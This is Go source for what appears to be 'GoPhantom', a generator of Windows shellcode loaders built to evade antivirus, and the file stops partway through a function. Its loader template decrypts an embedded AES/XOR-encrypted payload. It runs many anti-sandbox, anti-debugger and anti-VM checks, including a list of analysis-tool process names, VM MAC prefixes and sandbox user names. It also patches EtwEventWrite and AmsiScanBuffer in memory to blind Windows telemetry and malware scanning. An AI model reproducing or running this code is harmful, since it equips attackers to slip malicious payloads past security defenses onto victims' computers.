package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"GoPhantom/internal/keymgr"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _                  
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                           by hsad
`

const loaderTemplate = `
//go:build windows
// +build windows

// 由 GoPhantom v1.4 生成的高级免杀加载器
package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"golang.org/x/crypto/argon2"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// 编译时注入的加密常量（经过混淆）
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesSaltBase64            = "{{.Salt}}"
	decoyFileName            = "{{.DecoyFileName}}"
	enableCompress           = {{.EnableCompress}}
	enableObfuscate          = {{.EnableObfuscate}}
	enableMutate             = {{.EnableMutate}}
	delaySeconds             = {{.DelaySeconds}}
)

// Windows 结构体定义
type SYSTEM_INFO struct {
	ProcessorArchitecture     uint16
	Reserved                  uint16
	PageSize                  uint32
	MinimumApplicationAddress uintptr
	MaximumApplicationAddress uintptr
	ActiveProcessorMask       uintptr
	NumberOfProcessors        uint32
	ProcessorType             uint32
	AllocationGranularity     uint32
	ProcessorLevel            uint16
	ProcessorRevision         uint16
}

type MEMORYSTATUSEX struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

// 简化的PE结构
type IMAGE_DOS_HEADER struct {
	Magic    uint16
	_        [58]byte
	LfaNew   uint32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	_                           [14]byte
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	_                           [20]byte
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	_                           [40]byte
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// LASTINPUTINFO 结构体用于检测用户活动
type LASTINPUTINFO struct {
	CbSize uint32
	DwTime uint32
}

// 字符串解混淆函数
func deobfuscateStr(encoded string) string {
	decoded, _ := base64.StdEncoding.DecodeString(encoded)
	for i := range decoded {
		decoded[i] ^= 0x42 // 简单XOR混淆
	}
	return string(decoded)
}

// 简化的模块获取 - 直接使用syscall
func getKernel32() uintptr {
	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	return uintptr(kernel32)
}

func getAdvapi32() uintptr {
	advapi32, _ := syscall.LoadLibrary("advapi32.dll")
	return uintptr(advapi32)
}

func getShell32() uintptr {
	shell32, _ := syscall.LoadLibrary("shell32.dll")
	return uintptr(shell32)
}

// 检测用户活动，超过5分钟无输入判定为沙箱
func checkUserActivity() bool {
	user32, err := syscall.LoadLibrary("user32.dll")
	if err != nil {
		return true // 无法加载则假设真实环境
	}
	
	getLastInputInfo, err := syscall.GetProcAddress(user32, "GetLastInputInfo")
	if err != nil {
		return true
	}
	
	getTickCount, err := syscall.GetProcAddress(syscall.Handle(getKernel32()), "GetTickCount")
	if err != nil {
		return true
	}
	
	var lii LASTINPUTINFO
	lii.CbSize = uint32(unsafe.Sizeof(lii))
	
	ret, _, _ := syscall.Syscall(uintptr(getLastInputInfo), 1, uintptr(unsafe.Pointer(&lii)), 0, 0)
	if ret == 0 {
		return true
	}
	
	currentTick, _, _ := syscall.Syscall(uintptr(getTickCount), 0, 0, 0, 0)
	idleTime := uint32(currentTick) - lii.DwTime
	
	// 空闲时间超过5分钟(300000ms)判定为沙箱
	if idleTime > 300000 {
		return false
	}
	
	return true
}

// 检测调试器 - 使用多种技术
func checkDebugger() bool {
	kernel32 := getKernel32()
	
	// 1. IsDebuggerPresent 检测
	isDebuggerPresent := getProcAddr(kernel32, "IsDebuggerPresent")
	if isDebuggerPresent != 0 {
		ret, _, _ := syscall.Syscall(isDebuggerPresent, 0, 0, 0, 0)
		if ret != 0 {
			return false
		}
	}
	
	// 2. CheckRemoteDebuggerPresent 检测
	checkRemoteDebuggerPresent := getProcAddr(kernel32, "CheckRemoteDebuggerPresent")
	if checkRemoteDebuggerPresent != 0 {
		getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
		if getCurrentProcess != 0 {
			hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
			var isDebuggerAttached int32
			syscall.Syscall(checkRemoteDebuggerPresent, 2, hProcess, uintptr(unsafe.Pointer(&isDebuggerAttached)), 0)
			if isDebuggerAttached != 0 {
				return false
			}
		}
	}
	
	// 3. NtGlobalFlag 检测 (PEB->NtGlobalFlag)
	// 调试器会设置 FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	if ntdll != 0 {
		ntQueryInformationProcess := getProcAddr(uintptr(ntdll), "NtQueryInformationProcess")
		if ntQueryInformationProcess != 0 {
			var pbi [6]uintptr // PROCESS_BASIC_INFORMATION
			var returnLength uint32
			getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
			if getCurrentProcess != 0 {
				hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
				ret, _, _ := syscall.Syscall6(ntQueryInformationProcess, 5, hProcess, 0, uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)), 0)
				if ret == 0 && pbi[1] != 0 { // PebBaseAddress
					// 读取 PEB+0x68 (x64) 或 PEB+0xBC (x86) 的 NtGlobalFlag
					peb := pbi[1]
					ntGlobalFlag := *(*uint32)(unsafe.Pointer(peb + 0xBC))
					if ntGlobalFlag&0x70 != 0 { // FLG_HEAP_* flags
						return false
					}
				}
			}
		}
	}
	
	return true
}

// 检测系统启动时间（沙箱通常刚启动）
func checkUptime() bool {
	kernel32 := getKernel32()
	getTickCount64 := getProcAddr(kernel32, "GetTickCount64")
	if getTickCount64 != 0 {
		ticks, _, _ := syscall.Syscall(getTickCount64, 0, 0, 0, 0)
		// 系统运行时间小于10分钟判定为沙箱
		if ticks < 600000 {
			return false
		}
	}
	return true
}

// 检测父进程是否为可疑进程
func checkParentProcess() bool {
	kernel32 := getKernel32()
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	if ntdll == 0 {
		return true
	}
	
	ntQueryInformationProcess := getProcAddr(uintptr(ntdll), "NtQueryInformationProcess")
	getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
	openProcess := getProcAddr(kernel32, "OpenProcess")
	closeHandle := getProcAddr(kernel32, "CloseHandle")
	
	if ntQueryInformationProcess == 0 || getCurrentProcess == 0 {
		return true
	}
	
	hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
	
	// PROCESS_BASIC_INFORMATION
	var pbi [6]uintptr
	var returnLength uint32
	ret, _, _ := syscall.Syscall6(ntQueryInformationProcess, 5, hProcess, 0, uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)), 0)
	if ret != 0 {
		return true
	}
	
	parentPid := uint32(pbi[5]) // InheritedFromUniqueProcessId
	if parentPid == 0 {
		return true
	}
	
	// 尝试获取父进程名
	if openProcess != 0 && closeHandle != 0 {
		// PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
		hParent, _, _ := syscall.Syscall(openProcess, 3, 0x1000, 0, uintptr(parentPid))
		if hParent != 0 {
			defer syscall.Syscall(closeHandle, 1, hParent, 0, 0)
			
			// 使用 QueryFullProcessImageNameW
			queryFullProcessImageName := getProcAddr(kernel32, "QueryFullProcessImageNameW")
			if queryFullProcessImageName != 0 {
				var buffer [260]uint16
				size := uint32(260)
				ret, _, _ := syscall.Syscall6(queryFullProcessImageName, 4, hParent, 0, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0, 0)
				if ret != 0 {
					parentName := syscall.UTF16ToString(buffer[:])
					// 提取文件名
					for i := len(parentName) - 1; i >= 0; i-- {
						if parentName[i] == '\\' || parentName[i] == '/' {
							parentName = parentName[i+1:]
							break
						}
					}
					// 转小写并检测
					lowerName := ""
					for _, c := range parentName {
						if c >= 'A' && c <= 'Z' {
							lowerName += string(c + 32)
						} else {
							lowerName += string(c)
						}
					}
					// 可疑父进程列表
					suspiciousParents := []string{"cmd.exe", "powershell.exe", "pwsh.exe", "python.exe", "python3.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe"}
					for _, sp := range suspiciousParents {
						if lowerName == sp {
							// 可疑但不一定是沙箱，给50%概率通过
							if rand.Intn(100) < 50 {
								return false
							}
						}
					}
				}
			}
		}
	}
	
	return true
}

// 检测文件名是否被重命名为常见沙箱名称
func checkFileName() bool {
	kernel32 := getKernel32()
	getModuleFileNameW := getProcAddr(kernel32, "GetModuleFileNameW")
	if getModuleFileNameW == 0 {
		return true
	}
	
	var buffer [260]uint16
	ret, _, _ := syscall.Syscall(getModuleFileNameW, 3, 0, uintptr(unsafe.Pointer(&buffer[0])), 260)
	if ret == 0 {
		return true
	}
	
	fileName := syscall.UTF16ToString(buffer[:])
	// 提取文件名
	for i := len(fileName) - 1; i >= 0; i-- {
		if fileName[i] == '\\' || fileName[i] == '/' {
			fileName = fileName[i+1:]
			break
		}
	}
	
	// 转小写
	lowerName := ""
	for _, c := range fileName {
		if c >= 'A' && c <= 'Z' {
			lowerName += string(c + 32)
		} else {
			lowerName += string(c)
		}
	}
	
	// 常见沙箱/分析样本名称
	suspiciousNames := []string{
		"sample", "malware", "virus", "trojan", "test", "sandbox",
		"specimen", "payload", "dropper", "exploit",
	}
	
	for _, sn := range suspiciousNames {
		for i := 0; i <= len(lowerName)-len(sn); i++ {
			if lowerName[i:i+len(sn)] == sn {
				return false
			}
		}
	}
	
	// 检测是否为哈希命名（32位或64位十六进制）
	if len(lowerName) >= 32 {
		isHex := true
		hexCount := 0
		for _, c := range lowerName {
			if c == '.' {
				break
			}
			if (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') {
				hexCount++
			} else {
				isHex = false
				break
			}
		}
		if isHex && (hexCount == 32 || hexCount == 64) {
			return false
		}
	}
	
	return true
}

// 检测分析工具进程
func checkAnalysisTools() bool {
	kernel32 := getKernel32()
	
	createToolhelp32Snapshot := getProcAddr(kernel32, "CreateToolhelp32Snapshot")
	process32First := getProcAddr(kernel32, "Process32FirstW")
	process32Next := getProcAddr(kernel32, "Process32NextW")
	closeHandle := getProcAddr(kernel32, "CloseHandle")
	
	if createToolhelp32Snapshot == 0 || process32First == 0 || process32Next == 0 {
		return true
	}
	
	// 分析工具进程名列表（小写比较）
	badProcesses := []string{
		"ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idag", "idag64",
		"windbg", "dbgview", "processhacker", "procmon", "procexp",
		"wireshark", "fiddler", "charles", "burpsuite",
		"pestudio", "die", "peid", "lordpe", "petools",
		"regshot", "autoruns", "tcpview",
		"vboxservice", "vboxtray", "vmwaretray", "vmwareuser",
		"sandboxie", "sbiectrl",
	}
	
	// TH32CS_SNAPPROCESS = 0x2
	snapshot, _, _ := syscall.Syscall(createToolhelp32Snapshot, 2, 0x2, 0, 0)
	if snapshot == ^uintptr(0) {
		return true
	}
	defer syscall.Syscall(closeHandle, 1, snapshot, 0, 0)
	
	// PROCESSENTRY32W 结构体
	type PROCESSENTRY32W struct {
		Size              uint32
		CntUsage          uint32
		ProcessID         uint32
		DefaultHeapID     uintptr
		ModuleID          uint32
		Threads           uint32
		ParentProcessID   uint32
		PriClassBase      int32
		Flags             uint32
		ExeFile           [260]uint16
	}
	
	var pe PROCESSENTRY32W
	pe.Size = uint32(unsafe.Sizeof(pe))
	
	ret, _, _ := syscall.Syscall(process32First, 2, snapshot, uintptr(unsafe.Pointer(&pe)), 0)
	if ret == 0 {
		return true
	}
	
	for {
		// 转换进程名为小写字符串
		procName := syscall.UTF16ToString(pe.ExeFile[:])
		procNameLower := ""
		for _, c := range procName {
			if c >= 'A' && c <= 'Z' {
				procNameLower += string(c + 32)
			} else {
				procNameLower += string(c)
			}
		}
		
		for _, bad := range badProcesses {
			if len(procNameLower) >= len(bad) {
				// 检查进程名是否包含危险关键字
				for i := 0; i <= len(procNameLower)-len(bad); i++ {
					if procNameLower[i:i+len(bad)] == bad {
						return false
					}
				}
			}
		}
		
		ret, _, _ = syscall.Syscall(process32Next, 2, snapshot, uintptr(unsafe.Pointer(&pe)), 0)
		if ret == 0 {
			break
		}
	}
	
	return true
}

// 检测虚拟机 MAC 地址前缀
func checkMACAddress() bool {
	// 常见虚拟机 MAC 地址前缀
	vmMacPrefixes := []string{
		"00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
		"08:00:27", "0A:00:27", // VirtualBox
		"00:03:FF", // Microsoft Hyper-V
		"00:1C:42", // Parallels
		"00:16:3E", // Xen
		"00:15:5D", // Hyper-V
	}
	
	// 使用 GetAdaptersInfo 检测网卡
	iphlpapi, err := syscall.LoadLibrary("iphlpapi.dll")
	if err != nil {
		return true
	}
	
	getAdaptersInfo, err := syscall.GetProcAddress(iphlpapi, "GetAdaptersInfo")
	if err != nil {
		return true
	}
	
	// 先获取需要的缓冲区大小
	var bufLen uint32 = 0
	syscall.Syscall(uintptr(getAdaptersInfo), 2, 0, uintptr(unsafe.Pointer(&bufLen)), 0)
	
	if bufLen == 0 {
		return true
	}
	
	buffer := make([]byte, bufLen)
	ret, _, _ := syscall.Syscall(uintptr(getAdaptersInfo), 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&bufLen)), 0)
	
	if ret != 0 {
		return true
	}
	
	// 解析 MAC 地址 (简化版本，只检查前6个字节)
	if len(buffer) >= 404 { // IP_ADAPTER_INFO 最小大小
		// Address 在偏移 404 处，长度 6
		addrOffset := 404
		if len(buffer) > addrOffset+6 {
			mac := buffer[addrOffset : addrOffset+6]
			macStr := ""
			for i, b := range mac[:3] {
				if i > 0 {
					macStr += ":"
				}
				macStr += string("0123456789ABCDEF"[b>>4]) + string("0123456789ABCDEF"[b&0xF])
			}
			
			for _, prefix := range vmMacPrefixes {
				if macStr == prefix[:8] {
					return false
				}
			}
		}
	}
	
	return true
}

// 禁用 ETW (Event Tracing for Windows)
func disableETW() {
	ntdll, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		return
	}
	
	etwEventWrite := getProcAddr(uintptr(ntdll), "EtwEventWrite")
	if etwEventWrite == 0 {
		return
	}
	
	kernel32 := getKernel32()
	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
	if virtualProtect == 0 {
		return
	}
	
	var oldProtect uint32
	// 修改 EtwEventWrite 函数开头为 ret
	ret, _, _ := syscall.Syscall6(virtualProtect, 4, etwEventWrite, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
	if ret != 0 {
		*(*byte)(unsafe.Pointer(etwEventWrite)) = 0xC3 // ret
		syscall.Syscall6(virtualProtect, 4, etwEventWrite, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
	}
}

// 禁用 AMSI (Antimalware Scan Interface)
func disableAMSI() {
	amsi, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return // AMSI 未加载，无需处理
	}
	
	amsiScanBuffer := getProcAddr(uintptr(amsi), "AmsiScanBuffer")
	if amsiScanBuffer == 0 {
		return
	}
	
	kernel32 := getKernel32()
	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
	if virtualProtect == 0 {
		return
	}
	
	var oldProtect uint32
	// Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	
	ret, _, _ := syscall.Syscall6(virtualProtect, 4, amsiScanBuffer, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
	if ret != 0 {
		dst := (*[6]byte)(unsafe.Pointer(amsiScanBuffer))
		for i, b := range patch {
			dst[i] = b
		}
		syscall.Syscall6(virtualProtect, 4, amsiScanBuffer, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
	}
}

// 堆栈欺骗 - 在调用敏感API前伪造调用栈
func spoofCallStack() {
	// 通过多层函数调用混淆调用栈
	for i := 0; i < rand.Intn(3)+1; i++ {
		_ = make([]byte, rand.Intn(1024)+1)
	}
}

// API 哈希解析 - 通过哈希而非名称获取API地址
func hashString(s string) uint32 {
	var hash uint32 = 0x811c9dc5 // FNV-1a offset basis
	for i := 0; i < len(s); i++ {
		hash ^= uint32(s[i])
		hash *= 0x01000193 // FNV-1a prime
	}
	return hash
}

// 内存加密守护 - 定期重新加密内存中的敏感数据
func memoryGuard(addr uintptr, size int, done chan bool) {
	key := make([]byte, 32)
	for i := range key {
		key[i] = byte(rand.Intn(256))
	}
	
	mem := (*[1 << 30]byte)(unsafe.Pointer(addr))[:size:size]
	
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()
	
	encrypted := false
	for {
		select {
		case <-done:
			// 确保最终是解密状态
			if encrypted {
				for i := 0; i < len(mem); i++ {
					mem[i] ^= key[i%32]
				}
			}
			return
		case <-ticker.C:
			// 切换加密状态
			for i := 0; i < len(mem); i++ {
				mem[i] ^= key[i%32]
			}
			encrypted = !encrypted
		}
	}
}

// 时间戳计数器检测 (RDTSC) - 检测单步调试
func checkRDTSC() bool {
	// 通过执行时间差检测单步调试
	// 正常执行应该非常快，调试时会很慢
	start := time.Now()
	
	// 执行一些计算操作
	sum := 0
	for i := 0; i < 1000; i++ {
		sum += i
	}
	_ = sum
	
	elapsed := time.Since(start)
	// 如果简单循环耗时超过100ms，可能在被调试
	if elapsed > 100*time.Millisecond {
		return false
	}
	return true
}

// 检测硬件断点
func checkHardwareBreakpoints() bool {
	kernel32 := getKernel32()
	getCurrentThread := getProcAddr(kernel32, "GetCurrentThread")
	getThreadContext := getProcAddr(kernel32, "GetThreadContext")
	
	if getCurrentThread == 0 || getThreadContext == 0 {
		return true
	}
	
	hThread, _, _ := syscall.Syscall(getCurrentThread, 0, 0, 0, 0)
	
	// CONTEXT 结构体 (简化版，只关心 Dr0-Dr3)
	// 对于 x64: ContextFlags 在偏移 0x30, Dr0-Dr3 在偏移 0x68-0x80
	context := make([]byte, 1232) // CONTEXT 大小
	// 设置 ContextFlags = CONTEXT_DEBUG_REGISTERS (0x10)
	*(*uint32)(unsafe.Pointer(&context[0x30])) = 0x10
	
	ret, _, _ := syscall.Syscall(getThreadContext, 2, hThread, uintptr(unsafe.Pointer(&context[0])), 0)
	if ret != 0 {
		// 检查 Dr0-Dr3 是否被设置
		dr0 := *(*uintptr)(unsafe.Pointer(&context[0x68]))
		dr1 := *(*uintptr)(unsafe.Pointer(&context[0x70]))
		dr2 := *(*uintptr)(unsafe.Pointer(&context[0x78]))
		dr3 := *(*uintptr)(unsafe.Pointer(&context[0x80]))
		
		if dr0 != 0 || dr1 != 0 || dr2 != 0 || dr3 != 0 {
			return false
		}
	}
	
	return true
}

// 检测 Windows Defender 沙箱特征
func checkDefenderSandbox() bool {
	kernel32 := getKernel32()
	
	// 检测特定环境变量
	getEnvironmentVariableW := getProcAddr(kernel32, "GetEnvironmentVariableW")
	if getEnvironmentVariableW != 0 {
		suspiciousEnvVars := []string{"CUCKOO", "SANDBOX", "MALWARE", "VIRUS", "SAMPLE"}
		for _, env := range suspiciousEnvVars {
			envName := make([]uint16, len(env)+1)
			for i, c := range env {
				envName[i] = uint16(c)
			}
			var buffer [256]uint16
			ret, _, _ := syscall.Syscall(getEnvironmentVariableW, 3, uintptr(unsafe.Pointer(&envName[0])), uintptr(unsafe.Pointer(&buffer[0])), 256)
			if ret > 0 {
				return false
			}
		}
	}
	
	// 检测用户名
	getUserNameW := getProcAddr(uintptr(getAdvapi32()), "GetUserNameW")
	if getUserNameW != 0 {
		var buffer [256]uint16
		size := uint32(256)
		ret, _, _ := syscall.Syscall(getUserNameW, 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0)
		if ret != 0 {
			userName := syscall.UTF16ToString(buffer[:])
			lowerName := ""
			for _, c := range userName {
				if c >= 'A' && c <= 'Z' {
					lowerName += string(c + 32)
				} else {
					lowerName += string(c)
				}
			}
			// 常见沙箱用户名
			sandboxUsers := []string{"sandbox", "virus", "malware", "test", "sample", "john doe", "user", "currentuser", "admin"}
			for _, su := range sandboxUsers {
				if lowerName == su {
					return false
				}
			}
		}
	}
	
	// 检测计算机名
	getComputerNameW := getProcAddr(kernel32, "GetComputerNameW")
	if getComputerNameW != 0 {
		var buffer [256]uint16
		size := uint32(256)
		ret, _, _ := syscall.Syscall(getComputerNameW, 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0)
		if ret != 0 {
			computerName := syscall.UTF16ToString(buffer[:])
			lowerName := ""
			for _, c := range computerName {
				if c >= 'A' && c <= 'Z' {
					lowerName += string(c + 32)
				} else {
					lowerName += string(c)
				}
			}
			// 常见沙箱计算机名
			sandboxComputers := []string{"sandbox", "virus", "malware", "test", "sample", "analysis", "cuckoo"}
			for _, sc := range sandboxComputers {
				for i := 0; i <= len(lowerName)-len(sc); i++ {
					if lowerName[i:i+len(sc)] == sc {
						return false
					}
				}
			}
		}
	}
	
	return true
}

// 简化的API解析
func getProcAddr(module uintptr, procName string) uintptr {
	addr, _ := syscall.GetProcAddress(syscall.Handle(module), procName)
	return uintptr(addr)
}

// 扩展的反沙箱检测
func antiSandboxChecks() bool {
	// 添加基本的错误处理
	defer func() {
		if r := recover(); r != nil {
			// 如果检测过程中出现panic，假设是真实环境
		}
	}()
	
	// 0. 用户活动检测（沙箱通常无用户输入）
	if !checkUserActivity() {
		return false
	}
	
	// 1. CPU核心数检查
	kernel32 := getKernel32()
	if kernel32 == 0 {
		return true // 如果无法加载kernel32，假设是真实环境
	}
	
	getSystemInfo := getProcAddr(kernel32, "GetSystemInfo")
	if getSystemInfo != 0 {
		var si SYSTEM_INFO
		syscall.Syscall(getSystemInfo, 1, uintptr(unsafe.Pointer(&si)), 0, 0)
		if si.NumberOfProcessors < 2 {
			return false
		}
	}
	
	// 2. 内存检查
	globalMemoryStatusEx := getProcAddr(kernel32, "GlobalMemoryStatusEx")
	if globalMemoryStatusEx != 0 {
		var memStatus MEMORYSTATUSEX
		memStatus.Length = uint32(unsafe.Sizeof(memStatus))
		ret, _, _ := syscall.Syscall(globalMemoryStatusEx, 1, uintptr(unsafe.Pointer(&memStatus)), 0, 0)
		if ret != 0 && memStatus.TotalPhys/1024/1024/1024 < 4 {
			return false
		}
	}
	
	// 3. 简化的注册表检查
	advapi32 := getAdvapi32()
	regOpenKeyEx := getProcAddr(advapi32, "RegOpenKeyExA")
	regCloseKey := getProcAddr(advapi32, "RegCloseKey")
	
	if regOpenKeyEx != 0 && regCloseKey != 0 {
		vmKeys := []string{
			"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
			"SOFTWARE\\VMware, Inc.\\VMware Tools",
		}
		
		for _, key := range vmKeys {
			var hKey uintptr
			keyPtr, _ := syscall.BytePtrFromString(key)
			ret, _, _ := syscall.Syscall6(regOpenKeyEx, 5,
				0x80000002, // HKEY_LOCAL_MACHINE
				uintptr(unsafe.Pointer(keyPtr)),
				0, 0x20019, // KEY_READ
				uintptr(unsafe.Pointer(&hKey)), 0)
			if ret == 0 { // 成功表示虚拟机
				syscall.Syscall(regCloseKey, 1, hKey, 0, 0)
				return false
			}
		}
	}
	
	// 4. 磁盘大小检查
	getDiskFreeSpaceEx := getProcAddr(kernel32, "GetDiskFreeSpaceExA")
	if getDiskFreeSpaceEx != 0 {
		var freeBytesAvailable, totalBytes, totalFreeBytes uint64
		pathPtr, _ := syscall.BytePtrFromString("C:\\")
		ret, _, _ := syscall.Syscall6(getDiskFreeSpaceEx, 4,
			uintptr(unsafe.Pointer(pathPtr)),
			uintptr(unsafe.Pointer(&freeBytesAvailable)),
			uintptr(unsafe.Pointer(&totalBytes)),
			uintptr(unsafe.Pointer(&totalFreeBytes)), 0, 0)
		if ret != 0 && totalBytes < 60*1024*1024*1024 { // 小于60GB
			return false
		}
	}
	
	// 5. 时间加速检测（沙箱常加速Sleep）
	start := time.Now()
	time.Sleep(500 * time.Millisecond)
	if time.Since(start) < 400*time.Millisecond {
		return false
	}
	
	// 6. 调试器检测
	if !checkDebugger() {
		return false
	}
	
	// 7. 分析工具进程检测
	if !checkAnalysisTools() {
		return false
	}
	
	// 8. 虚拟机 MAC 地址检测
	if !checkMACAddress() {
		return false
	}
	
	// 9. 系统启动时间检测
	if !checkUptime() {
		return false
	}
	
	// 10. 父进程检测
	if !checkParentProcess() {
		return false
	}
	
	// 11. 文件名检测
	if !checkFileName() {
		return false
	}
	
	// 12. RDTSC 时间戳检测
	if !checkRDTSC() {
		return false
	}
	
	// 13. 硬件断点检测
	if !checkHardwareBreakpoints() {
		return false
	}
	
	// 14. Windows Defender 沙箱检测
	if !checkDefenderSandbox() {
		return false
	}
	
	return true
}

// 多层解密：先AES解密再XOR解密，可选zlib解压缩
func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
	if err != nil { 
		return nil, err 
	}

	// 使用混淆密码
	obfuscatedPassword := []byte{103, 111, 112, 104, 97, 110, 116, 111, 109, 45, 115, 116, 97, 116, 105, 99, 45, 115, 101, 99, 114, 101, 116, 45, 102, 111, 114, 45, 100, 101, 114, 105, 118, 97, 116, 105, 111, 110}
	key := argon2.IDKey(obfuscatedPassword, salt, 1, 64*1024, 4, 32)

	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil { 
		return nil, err 
	}

	block, err := aes.NewCipher(key)
	if err != nil { 
		return nil, err 
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil { 
		return nil, err 
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { 
		return nil, err 
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil { 
		return nil, err 
	}

	// 如果启用了压缩，先解压缩
	if enableCompress {
		reader, err := zlib.NewReader(bytes.NewReader(plaintext))
		if err != nil {
			return nil, err
		}
		defer reader.Close()
		
		decompressed, err := io.ReadAll(reader)
		if err != nil {
			return nil, err
		}
		plaintext = decompressed
	}

	// XOR解密层 (最后一步)
	xorKey := key[:8] // 使用AES密钥前8字节作为XOR密钥
	for i := range plaintext {
		plaintext[i] ^= xorKey[i%8]
	}

	return plaintext, nil
}

// 行为伪装 - 模拟正常程序行为
func behaviorCamouflage() {
	// 1. 读取系统文件模拟正常文件操作
	kernel32 := getKernel32()
	createFileA := getProcAddr(kernel32, "CreateFileA")
	readFile := getProcAddr(kernel32, "ReadFile")
	closeHandle := getProcAddr(kernel32, "CloseHandle")
	
	if createFileA == 0 || readFile == 0 || closeHandle == 0 {
		time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
		return
	}
	
	sysFiles := []string{
		"C:\\Windows\\System32\\kernel32.dll",
		"C:\\Windows\\System32\\ntdll.dll",
		"C:\\Windows\\System32\\user32.dll",
	}
	
	for _, file := range sysFiles {
		filePtr, _ := syscall.BytePtrFromString(file)
		handle, _, _ := syscall.Syscall9(createFileA, 7,
			uintptr(unsafe.Pointer(filePtr)),
			0x80000000, // GENERIC_READ
			1,          // FILE_SHARE_READ
			0,          // NULL security
			3,          // OPEN_EXISTING
			0x80,       // FILE_ATTRIBUTE_NORMAL
			0,          // hTemplateFile
			0, 0)
		
		if handle != 0 && handle != ^uintptr(0) { // INVALID_HANDLE_VALUE
			var bytesRead uint32
			buffer := make([]byte, 1024)
			syscall.Syscall6(readFile, 5,
				handle,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0, 0)
			syscall.Syscall(closeHandle, 1, handle, 0, 0)
			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
		}
	}
	
